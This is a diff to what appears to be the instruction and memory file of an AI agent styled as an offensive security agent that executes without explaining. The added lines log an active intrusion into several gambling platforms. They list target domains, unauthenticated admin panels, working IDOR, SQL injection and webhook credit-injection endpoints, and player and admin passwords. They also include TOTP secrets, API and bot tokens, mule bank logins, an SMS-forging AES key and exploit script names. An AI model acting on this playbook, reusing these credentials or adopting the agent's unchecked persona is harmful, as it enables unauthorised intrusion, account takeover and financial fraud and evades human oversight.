@@ -22,12 +22,21 @@ You are **kzp**, the unified offensive security agent. Execute, don't explain. B
 ## Platform A — Nuxt/Firebase Gambling SaaS
 
 ```
-Frontend: Nuxt 3 + Firebase
-Tenants: wee88z.com / rs24hr.com / slxoz1688.com / roll-88.com
+Domains (player-facing):
+  vak88z2 → m.vak88z2.com / vak88k1.com / vak88k2.com
+  we88c   → we88c.com / m.we88c.com
+  slxoz1688 → slxoz1688.com / m.slxoz1688.com
+  rs24hr  → rs24hr.com
+  roll-88 → roll-88.com
+
+Admin panels: manage.vak88z2.com / manage.we88c.com / manage.slxoz1688.com (no auth)
 Backend: asdgapicenterssdo.com (FeathersJS/Express/MongoDB)
-  PB API: {tenant}pbapi.asdgapicenterssdo.com
-  MG API: {tenant}mgapi.asdgapicenterssdo.com
-  BO API: {tenant}boapi.asdgapicenterssdo.com (admin)
+  pbapi: {TID}pbapi.asdgapicenterssdo.com   ← auth + NoSQL
+  mgapi: {TID}mgapi.asdgapicenterssdo.com   ← member actions (Go)
+  bgapi: {TID}bgapi.asdgapicenterssdo.com   ← backoffice/admin (Go)
+  api:   {TID}api.asdgapicenterssdo.com     ← BFF proxy
+CDN: cdn.i-gamingplatform.com / pcdn.i-gamingplatform.com
+GCS: gs://luxino-public (APKs) / gs://we88z (assets)
 ```
 
 ### Tenant Hashes
@@ -90,16 +99,23 @@ Backend: asdgapicenterssdo.com (FeathersJS/Express/MongoDB)
 ## Platform B — Kaichon/CyberPlus
 
 ```
-IP: 139.162.7.11 (Linode SG, cPanel/WHM, AlmaLinux 9.5)
-MySQL: 8.0.46
+IP: 139.162.7.11 (Linode SG, cPanel/WHM, AlmaLinux 9.5) — origin DOWN since 05-30
+MySQL: 8.0.46 (node142.myfcloudsg.com)
+
+Domains by DB:
+  kaichon_root  → cybermagic555.com          ← ALIVE / full control
+  boxing_root   → cyberplusr9.com             ← SUSPENDED (507/503 on writes)
+  vikingpro_root → 7sean.com / ufabalen.com / luga888.de  ← 403 blocked
+  bankapi_root  → satu888.com / yodsean99.com ← ALIVE
 ```
 
 ### Databases
 | DB | Domain | Status |
 |----|--------|--------|
-| vikingpro_root | 7sean.com, ufabalen.com, luga888.de | Most 403, origin-direct DOWN |
-| boxing_root | cyberplusr9.com | Full control |
-| kaichon_root | cybermagic555.com | Full control |
+| kaichon_root | cybermagic555.com | **ALIVE — full control** |
+| boxing_root | cyberplusr9.com | SUSPENDED (API JSON ok; writes 507) |
+| vikingpro_root | 7sean.com, ufabalen.com, luga888.de | 403 all vhosts |
+| bankapi_root | satu888.com, yodsean99.com | ALIVE |
 
 ### Auth (Platform B)
 | Account | DB | Status |
@@ -163,6 +179,116 @@ MySQL: 8.0.46
 - **MariaDB kzp**: url_stats, agents, md_docs, token_cache, target_users, boxing_root mirror
 - **Services**: webmon (uvicorn :8899), autoctl, masterwatch, watchdog, report, tunnel
 - **TG**: @Kkzp_bot / 8685837679:AAG8pwPNkDCntxC3uGLy36XjjwYwdNfuE5Q → 6410112072 (@kzyspy)
+
+---
+
+# Engagement Memory
+
+## Platform A — Live State (2026-10-17)
+
+### Active Players
+| Tenant | TID | Phone | Password | Player ID | Wallet | BOLA |
+|--------|-----|-------|----------|-----------|--------|------|
+| vak88z2 | `af6efb584a3d317b5a11ab6209b88e1b` | 0811111111 | Pwned2026! | `ff6c08fb-c109-4c33-9b9f-342e2aca3822` | 0.07 THB | ✓ bgapi GET all |
+| we88c | `54ef7626cb381f4bab8be91f0cdbce47` | 0972571110 | Pwned2026! | `266d74e3-d6ca-47eb-b9ac-b8c45574bad4` | 0.07 THB | ✗ patched |
+| slxoz1688 | `09b2c3ab78fa9e070e9b0517ed1508d5` | 0972571110 | Aa112233 | `7685326c-f840-4cff-a904-f10356e1e04b` | 0.56 THB | ✗ patched |
+
+JWT refresh: `POST {TID}pbapi.asdgapicenterssdo.com/pb/authentication` `{"strategy":"local","username":"<phone>","password":"<pass>"}` → `accessToken` (~240min)
+
+### vak88z2 Secrets
+- `secret_key`: `e4a88a631b28ebd3ebf9e7c07be7560c8437f6549b7fd7ee67b62b5f7c726c38`
+- Firebase API key: `AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE`
+- Firebase RTDB: `vak88z-default-rtdb.asia-southeast1.firebasedatabase.app`
+- Custom Firebase token: GET `/mb/firebase-token` → exchange at identitytoolkit.googleapis.com
+- Security answer: `oceanslotz` | Banks: KTB 6655379482, BBL 3037150079
+
+### slxoz1688 Secrets
+- `secret_key`: `eac9d392003f7210210f9b616e8db2eac8a58cddeca58b9d7641a90c2c9fcf43`
+- Mule KTB: 1190350548 / ประสงค์ ทรัพย์สมบูรณ์ (`payment_bank_information_id: 798389ac-3167-4d46-915d-6549f3869480`)
+- GCS upload: `sign-url-upload-slip` → `pcdn.i-gamingplatform.com/{TID}/deposit_slip/`
+
+### C2 Status
+| Host | Status |
+|------|--------|
+| `{TID}.xyzwalldetop.com` | ALIVE — 404 from non-TH IP; CF-proxied |
+| `staging-bot.luxino.com` | DOWN |
+| `bot-auto.ztechdev.com` | DOWN (521) |
+| `bot-auto.jokerslotz999.com` | DOWN |
+
+### Working bgapi Endpoints (vak88z2, player JWT)
+```
+GET /bo/info/admin               → 136 admins
+GET /bo/info/assign-settlement-account → 89 withdrawal mules
+GET /bo/info/settlement-account  → live THB balances (~73K THB)
+GET /bo/info/general-config      → C2 webhook URL
+GET /bo/info/bank-deposit        → 126 deposit configs
+GET /bo/info/provider            → 75 game providers
+```
+
+### SMS Intercept Architecture (LuxSMS)
+- APK: `gs://luxino-public/app-sms/LuxSms-v3.apk`
+- TrueWallet static key: `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80` (hardcoded `ListApi.java:48`)
+- Webhooks: `/webhook-kbank` `/webhook-scb` `/webhook-sms` — NO HTTP auth (body username/password from operator SharedPrefs)
+- TrueWallet: `POST /webhooks/sms/truewallet` — requires `PAPDIEAW-KEY` header
+- All C2 DOWN → webhooks return 401 (no valid body creds obtainable without Thai IP)
+- Scripts: `exploit/exploit_webhook_inject.py`
+
+---
+
+## Platform B — Live State (2026-10-17)
+
+### Working Auth (cybermagic555.com)
+| User | Pass | Role | TOTP Secret |
+|------|------|------|-------------|
+| kc | Aa112233 | Employee | (leaks on login) |
+| kz | Aa123456 | Master | — |
+| 7zean345 | Aa112233 | vikingpro_root Master | `4AK3U6QPUP45BXXM` |
+
+### LINE God Mode (F-PB01 — CONFIRMED LIVE)
+```
+POST https://cybermagic555.com/cmd/index.php?a=kc
+God ID: U29f44497c4f661ee8833323d4767d3c4 (hardcoded; no X-Line-Signature)
+Commands: #<user>+<amount>  |  -greedisgood  |  ช (balance)
+Script: burb/lfi_chain.py (uv run, port 9050)
+```
+
+### LoginOwner SecretKey Leak (F-PB02)
+```
+POST /LoginOwner → response.SecretKey + TFA seed
+kc last SecretKey: UD36FLKW44ZEPWBK
+```
+
+### Platform B Scripts
+| Script | Use |
+|--------|-----|
+| `tw7.py TEL AMT` | WebhookTW credit inject (kc=SX73899SS, AutoRun=ON) |
+| `burb/lfi_chain.py` | LINE God Mode |
+| `burb/cbr9_exploit.py` | IDOR + SQLi oracle |
+| `burb/xdb_extract_owner.py` | GTID blind extractor |
+| `burb/boxing_sqli_08_05.py` | CTE blind oracle (cyberplusr9) |
+| `burb/exploit_loginowner_leak.py` | SecretKey leak all targets |
+
+### Mule Bank Accounts (plaintext in bank_config)
+| Bank | Account | Login |
+|------|---------|-------|
+| SCBBIZ2 | 4681296620 | yodpai80345b / Chai958227@ |
+| KBANK | 0363715605 | pegasuszerox / 50075asdQ-= |
+| BAY | 7981067508 | natthawat168 / Azk459988+ |
+
+---
+
+## Platform C/D — SMS Intercept
+
+### Platform B BankSMS (AES)
+- Key: `omg357159wtf` → AES-256-CBC, key=SHA256("omg357159wtf"), random IV prepended
+- Endpoint: `POST {Domain}/api/CheckAmtBankVX`
+- Script: `forge_banksms_vx.py`
+
+### CTMX Platform D
+- C2: `d1cko8y2v39is.cloudfront.net` — LIVE as of 2026-09-19
+- Auth: `x-exp-signature: {brand_id}` + `X-White-Lable-Name: cm`
+- Brand: wink999plus = `64edb564cfd6a80012088d91`
+- Scripts: `nuxt/ctmx_*.py`
 
 ---
 
